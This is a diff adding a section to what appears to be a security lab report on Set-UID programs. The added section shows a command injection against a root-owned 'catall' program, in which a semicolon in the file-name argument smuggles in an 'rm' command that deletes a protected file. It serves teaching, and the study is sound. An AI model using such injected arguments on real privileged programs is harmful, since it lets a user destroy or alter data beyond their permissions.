@@ -291,3 +291,42 @@ $ ./setuid_ls
 This is a fake malware 
 ```
 As demonstrated, running the Set-UID program executed our malicious 'ls' instead of the expected system command. This is a very serious security vulnerability, because it allows a user to execute arbitrary code with elevated privileges.
+
+# Task 8 - Step 1
+
+Firstly, we compiled 'catall.c'.
+```
+$ gcc catall.c -o catall
+```
+We changed the ownership to root and made it a Set-UID program.
+
+```
+$ sudo chown root catall
+$ sudo chmod 4755 catall
+```
+
+Then we create a new file that can't be read by the default user ('seed').
+```
+$ echo "Secret file" > /home/seed/Desktop/secret.txt
+$ sudo chown root /home/seed/Desktop/secret.txt
+$ sudo chmod 000 /home/seed/Desktop/secret.txt
+```
+To test that we can't read the file as 'seed':
+```
+$ whoami
+seed
+$ ./catall /home/seed/Desktop/secret.txt
+/bin/cat: /home/seed/Desktop/secret.txt: Permission denied
+```
+Then, by using a semicolon (;), it allowed us to chain commands, enabling us to input aditional commands that the shell will execute.
+```
+$ ./catall '/home/seed/Desktop/secret.txt; rm /home/seed/Desktop/secret.txt'
+/bin/cat: /home/seed/Desktop/secret.txt: Permission denied
+```
+Although the program could not read the file due to permissions, it executed the additional 'rm' command, which deleted the file.
+```
+$ ls /home/seed/Desktop/secret.txt
+ls: cannot access '/home/seed/Desktop/secret.txt': No such file or directory
+```
+So, we successfully deleted the file using the 'catall' program.
+
